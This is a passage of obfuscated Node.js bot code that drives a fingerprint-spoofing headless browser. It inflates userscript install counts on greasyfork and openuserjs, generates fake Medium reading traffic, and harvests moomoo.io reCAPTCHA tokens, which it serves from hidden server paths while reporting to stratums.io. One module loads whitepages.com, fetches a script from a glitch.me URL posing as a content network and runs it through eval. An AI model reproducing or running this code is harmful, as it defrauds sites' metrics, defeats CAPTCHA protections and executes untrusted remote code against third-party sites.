      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x4) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': V(0xc) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + V(0x5) + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0xa)
    },
    {
      'url': V(0xc) + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x4) + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + V(0xf) + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + V(0x0) + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + V(0xe) + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + W(0x15) + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x179b + 0x3 * 0x982 + -0x1 * 0x3421
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * -0x135 + -0x1a5e + 0x1929)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x2278 + 0x25e1 + -0x305), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x60f * -0x2 + -0xb * -0x14b + -0x1b7 * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const Y = b,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x124 + -0x26fc + 0x4 * 0x976;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1edb + 0x13fb + -0x196b * 0x2; w < getRandomInt(-0x22 * 0x2f + -0x5 * -0x33b + 0x2 * -0x4f4, -0x67c + -0xd9a * -0x2 + -0x14b3); w++)
            await u['keyboard'][Y(0x3, '20at')]('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1 * -0x180d7 + -0x4aed * 0x2 + 0x30111);
        }
      }();
    }, -0xe06 + 0x479 * 0x5 + 0x1 * -0x7f3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x123 + 0x1b1 * -0x1 + 0x2d4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1b7f * 0x1 + 0x2381 + -0x802, -0x160f + 0x15b5 * 0x1 + 0x14 * 0x7)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xe2ca + 0x17b * -0x17 + 0x17a07);
    }, -0x91f + 0x22c * -0xc + 0x2393), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x4d6 * 0x2 + -0xb7 * 0x13 + 0x3e9;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x903 * 0x3 + 0x2641 + 0x1 * 0x80), await u['evaluate'](() => {
            const Z = c;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + Z(0x9), 0x22c8 + 0x20 * -0xad + 0x2 * -0x694), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x15573 * -0x7 + -0x1 * -0x358c6 + 0x13b8ff);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xd9f + 0x1e72 + -0x2bad * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xbe4 * 0x1 + -0x3f4 + 0x10a0);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3cac + -0x2166 + 0x7da2);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1 * 0x16bd + -0x1 * 0x44b + -0x1 * -0x1b09) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x2393 + 0x6 * 0x1f2 + -0x2f3e));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1091 * -0x1 + 0x48 * -0x5b + -0x907 * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](0x184a + -0xf8 + -0x1752, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x74 * -0x62 + -0x3489 + 0x25 * 0x3ad),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1f * 0x45 + 0x15c6 + 0x19a5),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + a0(0xb) + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      a1(0x6) + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2 * 0xe28 + 0x57 * -0x65 + 0x603; k < -0x1786 + 0x1503 + 0x287 * 0x1; k++)
    setTimeout(f, (0x51e9 * 0x2 + -0x1ae6c + -0x3 * -0xa6fe) * k * getRandomInt(0x2f3 + -0x26ec * 0x1 + 0x23fa, -0x153f + 0x231a * -0x1 + 0x385c));
  setInterval(() => {
    f();
    for (let l = -0x1560 + 0xd2e + 0x832; l < -0xf4d * 0x2 + -0x13 * -0xfc + 0x2 * 0x5f5; l++)
